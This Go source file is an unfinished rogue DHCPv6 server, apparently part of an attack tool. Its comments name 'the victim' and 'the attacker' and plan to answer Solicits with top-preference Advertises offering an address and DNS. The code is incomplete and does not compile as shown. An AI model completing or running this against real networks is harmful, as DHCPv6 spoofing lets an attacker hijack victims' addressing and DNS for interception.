package dhcp6

import (
	"fmt"
	"net"
	"github.com/insomniacslk/dhcp/dhcpv6"
	"golang.org/x/net/ipv6"
)

// What to do in this file //
// 1. Joining multicast group ff02::1:2 on port 547 to receive Solicits -> DONE
// 2. Listening for DHCPv6 packets from the victim -> DONE
// 3. Handling Solicit → send Advertise with preference=255 and offered IP
// 4. Handling Request → send Reply confirming the lease
// 5. Building and sending responses — Ethernet + IPv6 + UDP + DHCPv6 layers with correct options (ClientID, ServerID, IA_NA, DNS)

func ListenDHCPv6(ifaceName string, macAddr string, offeredIP net.IP) error {

	// Joining multicast group ff02::1:2 All DHCP Servers and Agents

	// need to listen (opening socket) first on port 547 udp - listen on all IPv6 interfaces on port 547 (DHCPv6 server port).
	conn, err := net.ListenPacket("udp6", "[::]:547")

	if err != nil {
		return fmt.Errorf("Failed to open connection on UDP port 547: %v", err)
	}

	defer conn.Close()

	// Joining the multicast group ff02::1:2
	p := ipv6.NewPacketConn(conn)

	iface, err := net.InterfaceByName(ifaceName) // -> get interface by name -> return the type i need (*net.Interface)

	if err != nil {
		return fmt.Errorf("failed to get interface %s: %v", ifaceName, err)
	}

	if err := p.JoinGroup(iface, &net.UDPAddr{IP: net.ParseIP("ff02::1:2")}); err != nil {
		return fmt.Errorf("failed to join multicast group: %v", err)
	}

	// create buffer
	buf := make([]byte, 65535)

	// receive new UDP packet (n -> It returns the number of bytes copied into) -- addr
	for {
		n, addr, err := conn.ReadFrom(buf)

		if err != nil {
			continue
		}

		// need to parse buffer
		dhcp, err := dhcpv6.MessageFromBytes(buf[:n])

		if err != nil {
			continue
		}

		// Switch case base on the message type
		switch dhcp.MsgType {

		case dhcpv6.MessageTypeSolicit:
			// Sending Advertise
			sendDHCPv6Response(conn, addr, dhcp, dhcpv6.MessageTypeAdvertise, offeredIP, macAddr)

		case dhcpv6.MessageTypeRequest:
			//send Reply
			sendDHCPv6Response(conn, addr, dhcp, dhcpv6.MessageTypeReply, offeredIP, macAddr)
		}
	}

	return nil

}

// Sending response (Advertise / Reply)
func sendDHCPv6Response(conn net.PacketConn, addr net.Addr, dhcp *dhcpv6.Message, msgType dhcpv6.MessageType, offeredIP net.IP, macAddr string) {

	// Advertise (msg-type, transaction-id, options), udp dst port 546
	// options: (Client Identifier - DUID, server-identifer - DUID, Identity Association for Non-temporary Address (IA_NA))

	// Extract DUID (inside the clientID)
	var clientID []byte

	// IAID must be unique among the identifiers for all of this client's IA_NAs (Need to be extracted)
	var iaid []byte

	for _, opt := range dhcp.Options {

		if opt.Code == layers.DHCPv6OptClientID {
			clientID = opt.Data
		}

		if opt.Code == layers.DHCPv6OptIANA {
			iaid = opt.Data[:4]
		}

	}

	// Build the server DUID (in this case me - the attacker)
	// DUID Based on Link-Layer Address Plus Time (DUID-LLT) -> combine timestamp + MAC address
	mac, _ := net.ParseMAC(macAddr)
	serverDUID := append([]byte{
		0x00, 0x01, // DUID type = 1 (LLT) -> 6 bits = 2 bytes 
		0x00, 0x01, // Hardware type = Ethernet -> 16 bits = 2 bytes
		0x00, 0x00, 0x00, 0x01,	// time (32 bit) -> variable = 6 bytes for Ethernet -> fixed for now (1 second)
	}, mac...)


	// building the dhcpv6 layer
	dhcpv6 := layers.DHCPv6{
		MsgType: msgType,
		TransactionID: dhcp.TransactionID,

		Options: layers.DHCPv6Options{

			// client ID
			layers.DHCPv6Option{
				Code: layers.DHCPv6OptClientID,
				Data: clientID,
			},

			// Server ID
			layers.DHCPv6Option{
				Code: layers.DHCPv6OptServerID,
				Data: serverDUID,
			},

			// IA_NA (need: IAID, IA_Address (inside) -> )
			layers.DHCPv6Option{
				Code: layers.DHCPv6OptIANA,
				// Data: ,
			}

		},
	}


}
